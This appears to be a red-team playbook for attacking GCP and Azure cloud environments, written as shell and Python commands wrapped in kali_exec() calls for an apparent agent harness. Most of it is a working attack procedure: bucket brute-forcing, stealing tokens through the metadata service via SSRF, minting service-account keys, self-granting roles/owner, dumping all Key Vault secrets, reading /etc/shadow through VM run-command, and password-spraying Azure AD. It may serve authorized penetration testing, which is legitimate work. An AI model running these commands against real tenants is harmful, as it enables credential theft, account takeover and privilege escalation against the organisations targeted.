# PLAYBOOK: Cloud GCP & Azure Penetration Testing
# April 2026 Red Team Stack
# GCP · Azure · Multi-cloud environments

---

## GCP Attack Surface

```
EXTERNAL:
  Google Cloud Storage buckets (public read/write)
  Cloud Run / App Engine exposed endpoints
  Cloud Functions with weak auth
  GCP API keys in code

PRIVILEGE ESCALATION:
  IAM bindings misconfigurations
  Service Account key abuse
  Workload Identity Federation weaknesses
  Editor / Owner role scope creep

COMPUTE:
  Compute Engine instance metadata (169.254.169.254)
  SSH key injection via metadata
  Serial console access
  Snapshot/image exposure
```

---

## PHASE 1 — GCP EXTERNAL RECON

```bash
# GCS Bucket enumeration
kali_exec("python3 -c \"
import requests, json

company = '[COMPANY]'
variants = [
    company, f'{company}-backup', f'{company}-prod', f'{company}-dev',
    f'{company}-staging', f'{company}-data', f'{company}-assets',
    f'{company}-media', f'{company}-static', f'{company}-logs',
    f'{company}-builds', f'{company}-archives', f'{company}-uploads'
]

for bucket in variants:
    r = requests.get(f'https://storage.googleapis.com/{bucket}/')
    if r.status_code != 404:
        print(f'FOUND [{r.status_code}]: gs://{bucket}')
\"")

# Access public bucket
kali_exec("gsutil ls gs://[BUCKET_NAME] 2>/dev/null || curl -s 'https://storage.googleapis.com/[BUCKET_NAME]'")
kali_exec("gsutil cp gs://[BUCKET_NAME]/[FILE] /tmp/ 2>/dev/null")

# Check for writable buckets
kali_exec("echo 'test' | gsutil cp - gs://[BUCKET_NAME]/test_write.txt 2>/dev/null && echo 'WRITABLE'")
```

### GCP Metadata SSRF
```bash
# From SSRF in GCP-hosted app:
kali_exec("curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' -H 'Metadata-Flavor: Google'")
kali_exec("curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'")

# Token → use with gcloud
ACCESS_TOKEN=$(curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
kali_exec("curl -s -H 'Authorization: Bearer $ACCESS_TOKEN' https://www.googleapis.com/oauth2/v1/tokeninfo")
```

---

## PHASE 2 — GCP WITH CREDENTIALS

```bash
# Authenticate
kali_exec("gcloud auth activate-service-account --key-file=[KEY.json]")
# OR with access token:
kali_exec("gcloud config set auth/access_token [TOKEN]")

# Who am I?
kali_exec("gcloud auth list")
kali_exec("gcloud config get-value project")

# What permissions do I have?
kali_exec("gcloud projects get-iam-policy [PROJECT_ID] --format json | python3 -c \"import sys,json,os; iam=json.load(sys.stdin); me=os.environ.get('GCLOUD_USER',''); [print(b['role'], b['members']) for b in iam['bindings'] if any(me in m for m in b['members'])]\" 2>/dev/null")

# Enumerate everything
kali_exec("gcloud compute instances list")
kali_exec("gcloud sql instances list")
kali_exec("gcloud storage buckets list")
kali_exec("gcloud functions list")
kali_exec("gcloud run services list")
kali_exec("gcloud container clusters list")
kali_exec("gcloud secrets list")
kali_exec("gcloud iam service-accounts list")
```

### GCP IAM Privesc
```bash
# Check for privesc paths
kali_exec("gcloud iam service-accounts list --format json")

# Try to create a key for another service account
kali_exec("gcloud iam service-accounts keys create /tmp/sa_key.json --iam-account=[SA_EMAIL]")

# If roles/iam.serviceAccountKeyAdmin or roles/iam.serviceAccountAdmin:
kali_exec("gcloud iam service-accounts add-iam-policy-binding [TARGET_SA] --member='serviceAccount:[OWN_SA]' --role='roles/iam.serviceAccountTokenCreator'")

# Impersonate another SA
kali_exec("gcloud auth print-access-token --impersonate-service-account=[TARGET_SA]")

# If roles/editor or roles/owner:
kali_exec("gcloud projects add-iam-policy-binding [PROJECT] --member='serviceAccount:[OWN_SA]' --role='roles/owner'")
```

### GCP Secrets
```bash
# Access Secret Manager
kali_exec("gcloud secrets list")
kali_exec("gcloud secrets versions access latest --secret=[SECRET_NAME]")

# Cloud SQL
kali_exec("gcloud sql instances describe [INSTANCE]")
kali_exec("gcloud sql users list --instance=[INSTANCE]")
kali_exec("gcloud sql connect [INSTANCE] --user=root")

# GCS sensitive files
kali_exec("gsutil ls -r gs://[BUCKET]/ | grep -E '.env|.json|.key|credentials|secret|backup'")
```

### GCP Automated Tools
```bash
# GCPBucketBrute
kali_exec("python3 GCPBucketBrute/gcpbucketbrute.py -k [KEY.json] -w wordlist.txt")

# ScoutSuite GCP
kali_exec("scout gcp --service-account [KEY.json] --no-browser -o loot/[MISSION]/cloud/gcp_scoutsuite/")

# Enumerate with gcp_enum
kali_exec("python3 gcp_enum.py --key [KEY.json] --output loot/[MISSION]/cloud/gcp_enum.json")
```

---

## AZURE ATTACK SURFACE

```
EXTERNAL:
  Azure Blob Storage (public containers)
  Azure App Service / Functions
  Exposed management endpoints

IDENTITY (MOST COMMON ATTACK VECTOR):
  Azure AD misconfigs (now "Entra ID")
  Service principal credential theft
  Managed Identity abuse
  Conditional Access policy gaps
  Legacy authentication enabled

COMPUTE:
  Instance metadata service (169.254.169.254)
  Azure Bastion abuse
  VM run command abuse
```

---

## PHASE 3 — AZURE EXTERNAL RECON

```bash
# Azure Blob Storage enumeration
kali_exec("python3 -c \"
import requests
company = '[COMPANY]'
accounts = [company, f'{company}backup', f'{company}dev', f'{company}prod', f'{company}sa']
for acct in accounts:
    url = f'https://{acct}.blob.core.windows.net/?comp=list'
    r = requests.get(url)
    if r.status_code != 404:
        print(f'FOUND [{r.status_code}]: {url}')
\"")

# MicroBurst — comprehensive Azure enumeration
kali_exec("git clone https://github.com/NetSPI/MicroBurst.git /opt/MicroBurst")
kali_exec("pwsh -c \"Import-Module /opt/MicroBurst/MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base [COMPANY]\"")

# Azure metadata SSRF
kali_exec("curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'")
kali_exec("curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/'")
```

---

## PHASE 4 — AZURE WITH CREDENTIALS

```bash
# Authenticate
kali_exec("az login --service-principal -u [APP_ID] -p [SECRET] --tenant [TENANT_ID]")
# OR with token:
kali_exec("az login --use-device-code")

# Who am I?
kali_exec("az account show")
kali_exec("az ad signed-in-user show")

# Enumerate subscriptions and resources
kali_exec("az account list -o table")
kali_exec("az account set --subscription [SUB_ID]")
kali_exec("az resource list -o table")

# Virtual machines
kali_exec("az vm list -o table")
kali_exec("az vm list-ip-addresses -o table")

# Storage accounts
kali_exec("az storage account list -o table")
kali_exec("az storage container list --account-name [ACCOUNT] --auth-mode login")

# Key Vault
kali_exec("az keyvault list -o table")
kali_exec("az keyvault secret list --vault-name [VAULT_NAME]")
kali_exec("az keyvault secret show --name [SECRET] --vault-name [VAULT_NAME]")

# App registrations / Service principals
kali_exec("az ad app list -o table")
kali_exec("az ad sp list -o table")
```

### Azure AD / Entra ID Attacks
```bash
# Password spray Azure AD (careful — lockout is 10 attempts)
kali_exec("python3 MSOLSpray.py --userlist users.txt --password [PASSWORD]")

# Check MFA status and legacy auth
kali_exec("az ad user list --query \"[?userType=='Member'].{UPN:userPrincipalName, MFA:strongAuthenticationMethods}\" -o table")

# Enumerate Azure AD groups
kali_exec("az ad group list -o table")
kali_exec("az ad group member list -g [GROUP_ID] -o table")

# Find privileged accounts
kali_exec("az role assignment list --all -o table | grep -i 'Owner\\|Contributor\\|Admin'")

# App permissions (may expose over-permissioned apps)
kali_exec("az ad app permission list --id [APP_ID] -o json")
```

### Azure Privesc Paths
```bash
# If Contributor: run commands on VMs
kali_exec("az vm run-command invoke --resource-group [RG] --name [VM_NAME] --command-id RunShellScript --scripts 'id; whoami; cat /etc/shadow'")

# If Key Vault access: get all secrets
kali_exec("for secret in $(az keyvault secret list --vault-name [VAULT] --query '[].id' -o tsv); do az keyvault secret show --id $secret --query 'value' -o tsv; done")

# Managed Identity abuse (from inside VM)
kali_exec("curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/' | python3 -c \"import sys,json; print(json.load(sys.stdin)['access_token'])\"")
```

### Azure Automated Tools
```bash
# ROADrecon — Azure AD attack paths (like BloodHound for Azure)
kali_exec("pip install roadrecon")
kali_exec("roadrecon gather --username [USER] --password [PASS]")
kali_exec("roadrecon gui")  # Web UI for graph visualization

# Stormspotter — similar to ROADrecon
kali_exec("git clone https://github.com/Azure/Stormspotter.git")

# ScoutSuite Azure
kali_exec("scout azure --cli --no-browser -o loot/[MISSION]/cloud/azure_scoutsuite/")

# PowerZure — Azure post-exploitation
kali_exec("git clone https://github.com/hausec/PowerZure.git")
kali_exec("pwsh -c \"Import-Module ./PowerZure/PowerZure.psm1\"")
```

---

## MULTI-CLOUD NOTES

```
Environment          Primary Tool          Supplement
───────────────────────────────────────────────────────────
AWS only             Pacu + ScoutSuite     Prowler CIS
GCP only             gcpbucketbrute        ScoutSuite GCP
Azure only           ROADrecon + MicroBurst ScoutSuite Azure
AWS + GCP            ScoutSuite (both)     Prowler + manual
All three            ScoutSuite all        Custom enum scripts
```

**Cross-cloud trust attacks:**
- AWS → GCP: Check for GCP service account keys stored in AWS Secrets Manager
- Azure → AWS: Check for AWS access keys in Azure Key Vault
- GCP → Azure: Check for Azure SP credentials in GCP Secret Manager
- Always test cross-cloud access — often more permissive than single-cloud

---

## Evidence

```
loot/[MISSION]/cloud/
├── gcp_scoutsuite/    # ScoutSuite GCP report
├── azure_scoutsuite/  # ScoutSuite Azure report
├── gcp_enum.json      # Raw GCP enumeration
├── azure_resources.json # Raw Azure enum
├── privesc_paths.md   # Identified escalation paths
└── cloud_findings.md  # Cloud-specific findings
```

---

*April 2026 | Cloud testing — minimal-footprint approach, log everything you do*
